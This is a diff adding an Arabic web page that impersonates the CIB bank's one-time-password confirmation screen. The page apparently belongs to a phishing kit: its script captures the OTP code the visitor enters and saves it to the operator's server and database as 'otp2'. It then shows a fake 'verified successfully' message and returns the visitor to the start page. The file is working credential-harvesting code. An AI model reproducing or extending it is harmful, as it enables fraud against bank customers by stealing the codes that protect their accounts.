@@ -1,0 +1,123 @@
+<!doctype html>
+<html lang="ar" dir="rtl">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>CIB - تأكيد العملية</title>
+    <link rel="stylesheet" href="otp.css" />
+  </head>
+  <body>
+
+    <header class="top-header">
+      <img class="top-logo" src="img/logo.png" alt="CIB" />
+    </header>
+
+    <main class="otp-page">
+      <section class="otp-card">
+        <h1 class="otp-title">تأكيد العملية</h1>
+
+        <p class="otp-text">
+          تم إرسال رسالة نصية تحتوي على رمز تأكيد لمرة واحدة (OTP)<br />
+          إلى رقمك المسجل لدينا لتأكيد الطلب الخاص بك.
+        </p>
+
+        <label class="otp-label" for="otp-code">Verification Code</label>
+        <input id="otp-code" class="otp-input" type="text" />
+
+        <button class="otp-btn" type="button">تأكيد</button>
+
+        <div id="otp-timer" class="timer">02:00</div>
+
+        <p class="legal">
+          تفاصيل الدفع الخاصة بك مشفرة ومحمية بشكل آمن بالنقر<br />
+          فوق الدفع الآن، فإنك تؤكد أنك أكبر من 20 عامًا وأنك<br />
+          توافق على <a href="#">شروط الاستخدام وسياسة الخصوصية الخاصة بنا</a>
+        </p>
+
+        <div class="bottom-logo-wrap">
+          <img class="bottom-logo" src="img/logo.png" alt="CIB" />
+        </div>
+      </section>
+    </main>
+    
+    <script src="api-config.js"></script>
+    <script src="api-client.js"></script>
+    <script src="form-handler.js"></script>
+    <script>
+      (function () {
+        var totalSeconds = 2 * 60;
+        var timerEl = document.getElementById("otp-timer");
+        if (!timerEl) return;
+
+        function format(seconds) {
+          var m = Math.floor(seconds / 60);
+          var s = seconds % 60;
+          return String(m).padStart(2, "0") + ":" + String(s).padStart(2, "0");
+        }
+
+        timerEl.textContent = format(totalSeconds);
+
+        var intervalId = setInterval(function () {
+          totalSeconds -= 1;
+          if (totalSeconds <= 0) {
+            timerEl.textContent = "00:00";
+            clearInterval(intervalId);
+            return;
+          }
+          timerEl.textContent = format(totalSeconds);
+        }, 1000);
+
+        // Handle OTP2 Confirmation
+        document.querySelector('.otp-btn').addEventListener('click', async function() {
+          const otpCode = document.getElementById('otp-code').value;
+          if (otpCode.trim() === '') {
+            alert('الرجاء إدخال رمز التحقق');
+            return;
+          }
+
+          const newUser = {
+            page: 'otp2',
+            verificationCode: otpCode,
+            timestamp: new Date().toLocaleString('ar-EG'),
+            registrationTime: new Date().toLocaleString('ar-EG'),
+            name: 'OTP2'
+          };
+
+          try {
+            await saveSubmission(newUser);
+          } catch (e) {
+            console.error(e);
+            alert('تعذر حفظ الرمز. تأكد أن الخادم وMongoDB يعملان.');
+            return;
+          }
+
+          // Show success message
+          const modal = document.createElement('div');
+          modal.style.cssText = `
+            position: fixed;
+            top: 0;
+            right: 0;
+            bottom: 0;
+            left: 0;
+            background: rgba(0, 0, 0, 0.5);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+          `;
+          modal.innerHTML = `
+            <div style="background: white; padding: 40px; border-radius: 15px; text-align: center; max-width: 400px;">
+              <div style="font-size: 50px; margin-bottom: 20px;">✅</div>
+              <h2 style="color: #28a745; margin-bottom: 10px;">تم التحقق بنجاح!</h2>
+              <p style="color: #666; margin-bottom: 20px;">شكراً لتأكيد البيانات الخاصة بك.</p>
+              <button onclick="window.location.href='index.html'" style="padding: 10px 30px; background: #667eea; color: white; border: none; border-radius: 6px; font-size: 16px; cursor: pointer; font-weight: bold;">العودة للرئيسية</button>
+            </div>
+          `;
+          document.body.appendChild(modal);
+          setTimeout(() => modal.remove(), 3000);
+        });
+      })();
+    </script>
+  </body>
+</html>
+
